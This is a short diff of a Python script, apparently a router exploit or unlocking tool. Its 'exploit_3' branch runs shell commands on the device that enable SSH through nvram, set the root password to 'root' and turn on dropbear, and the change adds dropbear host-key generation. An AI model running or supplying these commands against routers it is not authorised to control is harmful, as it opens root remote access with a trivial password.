@@ -153,6 +153,9 @@ if exec_cmd == exploit_3:
 exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
 exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
 exec_cmd(r"echo -e 'root\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt")
+exec_cmd(r"mkdir -p /etc/dropbear")
+exec_cmd(r"dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key 0<&- 2>&- >&- || true")
+exec_cmd(r"dropbearkey -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key 0<&- 2>&- >&- || true")
 exec_cmd(r"/etc/init.d/dropbear enable")
 
 print('Run SSH server on port 22 ...')
